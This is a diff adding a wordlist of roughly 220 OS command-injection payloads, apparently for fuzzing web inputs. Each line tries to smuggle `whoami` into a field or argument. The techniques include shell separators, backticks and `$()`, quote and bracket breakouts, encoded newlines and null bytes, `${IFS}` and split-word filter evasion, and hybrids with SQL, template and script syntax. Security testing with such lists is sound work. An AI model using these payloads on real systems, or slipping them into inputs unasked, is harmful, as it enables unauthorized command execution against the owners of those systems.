@@ -1,0 +1,223 @@
+; whoami; echo 'test'
+| whoami | echo 'test'
+|| whoami || echo 'test'
+& whoami & echo 'test'
+&& whoami && echo 'test'
+`whoami` && echo 'test'
+$(whoami) && echo 'test'
+test; whoami; test
+test | whoami | test
+test || whoami || test
+test & whoami & test
+test && whoami && test
+test `whoami` test
+test $(whoami) test
+'; whoami; '
+"; whoami; "
+'| whoami |'
+"| whoami |"
+'|| whoami ||'
+"|| whoami ||"
+'& whoami &'
+"& whoami &"
+'&& whoami &&'
+"&& whoami &&"
+'`whoami`'
+"`whoami`"
+'$(whoami)'
+"$(whoami)"
+') ; whoami ; ('
+") ; whoami ; ("
+') | whoami | ('
+") | whoami | ("
+') || whoami || ('
+") || whoami || ("
+') && whoami && ('
+") && whoami && ("
+'; whoami; echo '
+"; whoami; echo "
+'|| whoami || echo '
+"|| whoami || echo "
+1; whoami
+1| whoami
+1|| whoami
+1& whoami
+1&& whoami
+1`whoami`
+1$(whoami)
+a; whoami
+a| whoami
+a|| whoami
+a& whoami
+a&& whoami
+a`whoami`
+a$(whoami)
+-1; whoami
+-1| whoami
+-1|| whoami
+-1& whoami
+-1&& whoami
+-1`whoami`
+-1$(whoami)
+'; whoami; #
+"; whoami; #
+'| whoami | #
+"| whoami | #
+'|| whoami || #
+"|| whoami || #
+'& whoami & #
+"& whoami & #
+'&& whoami && #
+"&& whoami && #
+'`whoami`#
+"`whoami`#
+'$(whoami)#
+"$(whoami)#
+%0a; whoami
+%0a| whoami
+%0a|| whoami
+%0a& whoami
+%0a&& whoami
+%0a`whoami`
+%0a$(whoami)
+%0d; whoami
+%0d| whoami
+%0d|| whoami
+%0d& whoami
+%0d&& whoami
+%0d`whoami`
+%0d$(whoami)
+%0a%0d; whoami
+%0a%0d| whoami
+%0a%0d|| whoami
+%0a%0d& whoami
+%0a%0d&& whoami
+%0a%0d`whoami`
+%0a%0d$(whoami)
+'; whoami; --
+"; whoami; --
+'| whoami | --
+"| whoami | --
+'; whoami; /*
+"; whoami; /*
+'| whoami | /*
+"| whoami | /*
+*/; whoami; /*
+*/| whoami | /*
+*/|| whoami || /*
+*/& whoami & /*
+*/&& whoami && /*
+'; whoami; //
+"; whoami; //
+'| whoami | //
+"| whoami | //
+x'; whoami; '
+x"; whoami; "
+x'| whoami |'
+x"| whoami |"
+x'|| whoami ||'
+x"|| whoami ||"
+'; whoami || '
+"; whoami || "
+'; whoami && '
+"; whoami && "
+`whoami` || echo 'test'
+$(whoami) || echo 'test'
+`whoami` && echo 'test'
+$(whoami) && echo 'test'
+$(whoami)$(echo)
+`whoami``echo`
+'; $(whoami); '
+"; $(whoami); "
+'; `whoami`; '
+"; `whoami`; "
+'$(whoami)'
+"`whoami`"
+test'); whoami; ('test
+test"); whoami; ("test
+test'| whoami |'test
+test"| whoami |"test
+)); whoami; ((
+")); whoami; (("
+')); whoami; (('
+]; whoami; [
+"]; whoami; ["
+']; whoami; ['
+}; whoami; {
+"}; whoami; {"
+'}; whoami; {'
+>; whoami
+<; whoami
+>>; whoami
+<<; whoami
+<>; whoami
+>| whoami
+<| whoami
+>>| whoami
+<<| whoami
+<>| whoami
+test'; whoami; echo 'test
+test"; whoami; echo "test
+'; whoami; exit; '
+"; whoami; exit; "
+'|| whoami || exit ||'
+"|| whoami || exit ||"
+${IFS}whoami
+$IFS$9whoami
+{whoami}
+[whoami]
+(whoami)
+((whoami))
+$'whoami'
+$"whoami"
+'; whoami${IFS}; '
+"; whoami${IFS}; "
+'; who$()ami; '
+"; who$()ami; "
+'; who${x}ami; '
+"; who${x}ami; "
+'; who'am'i; '
+"; who"am"i; "
+'\nwhoami\n'
+"\nwhoami\n"
+'\rwhoami\r'
+"\rwhoami\r"
+'; \nwhoami\n; '
+"; \nwhoami\n; "
+%00; whoami
+%00| whoami
+%00|| whoami
+%00& whoami
+%00&& whoami
+'; whoami%00
+"; whoami%00
+'| whoami%00
+"| whoami%00
+```; whoami; ```
+"""; whoami; """
+'''; whoami; '''
+===; whoami; ===
+---; whoami; ---
+___; whoami; ___
+***; whoami; ***
++++; whoami; +++
+~~~; whoami; ~~~
+@@@; whoami; @@@
+$$$; whoami; $$$
+%%%; whoami; %%%
+^^^; whoami; ^^^
+&&&; whoami; &&&
+|||; whoami; |||
+test' OR '1'='1'; whoami; --
+test" OR "1"="1"; whoami; --
+test' AND '1'='1'; whoami; --
+test" AND "1"="1"; whoami; --
+<script>; whoami; </script>
+<img>; whoami; </img>
+<?php ; whoami; ?>
+<% ; whoami; %>
+{{ ; whoami; }}
+{% ; whoami; %}
+${ ; whoami; }
+#{ ; whoami; }
+@{ ; whoami; }
